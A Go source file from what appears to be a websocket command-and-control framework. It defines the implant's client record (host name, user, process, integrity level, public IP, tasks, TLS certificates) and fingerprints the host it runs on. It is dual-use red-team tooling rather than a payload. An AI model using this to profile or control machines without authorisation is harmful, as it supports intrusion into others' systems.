package data

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/user"
	"regexp"
	"runtime"
	"time"

	"github.com/google/uuid"
	"github.com/latortuga71/wsC2/internal/modules/basic"
)

type Client struct {
	ClientId             string          `json:"client_id"`
	HostName             string          `json:"host_name"`
	Username             string          `json:"user_name"`
	ProcessName          string          `json:"process_name"`
	ProcessId            int             `json:"process_id"`
	Arch                 string          `json:"arch"`
	Integrity            string          `json:"integrity"`
	LastSeen             time.Time       `json:"last_seen"`
	Online               bool            `json:"online"`
	PublicIp             string          `json:"public_ip"`
	Tasks                []Task          `json:"tasks"`
	Results              []TaskResult    `json:"results"`
	ClientTLSCertificate tls.Certificate `json:"-"`
	//WSConn               *websocket.Conn `json:"-"`
	WSConn           *Connection    `json:"-"`
	ClientCaCertPool *x509.CertPool `json:"-"`
	ClientCertPEM    string         `json:"-"`
	ClientKeyPem     string         `json:"-"`
	ClientRootCA     string         `json:"-"`
}

func (c *Client) ToBytes() []byte {
	data, err := json.Marshal(c)
	if err != nil {
		log.Printf("Error Converting Client To Bytes: %s", err.Error())
		return nil
	}
	return data
}

func GetPublicIp() string {
	result := ""
	rand.Seed(time.Now().UnixNano())
	random := 0 + rand.Intn(11-1)
	possibleSites := [11]string{"https://api.globaldatacompany.com/common/v1/ip-info", "https://ifconfig.me/ip", "http://checkip.dyndns.org", "https://icanhazip.com/", "https://ipapi.co/ip", "https://api.myip.com", "https://api.ipify.org/", "https://ipinfo.io/ip", "https://ip.seeip.org/", "https://api.bigdatacloud.net/data/client-ip", "https://api.my-ip.io/ip"}
	resp, err := http.Get(possibleSites[random])
	if err != nil {
		return "Failed to get public ip."
	}
	defer resp.Body.Close()
	ip, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "Failed to get public ip."
	}
	ipString := string(ip)
	re := regexp.MustCompile(`(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}`)
	submatchall := re.FindAllString(ipString, -1)
	for _, element := range submatchall {
		result += element
	}
	return result
}

func NewClient() *Client {
	hostname, err := os.Hostname()
	user, err := user.Current()
	process, err := os.Executable()
	var arch string = runtime.GOARCH
	var integrity string
	if err != nil {
		log.Fatalf(err.Error())
	}
	if runtime.GOOS == "windows" {
		arch = runtime.GOARCH
		integrity = basic.GetIntegrity()
	}
	return &Client{
		ClientId:    GenerateUUID(),
		HostName:    hostname,
		Username:    user.Username,
		ProcessName: process,
		ProcessId:   os.Getpid(),
		Online:      true,
		Integrity:   integrity,
		Arch:        arch,
		PublicIp:    GetPublicIp(),
	}

}

func GenerateUUID() string {
	id := uuid.New()
	return id.String()
}
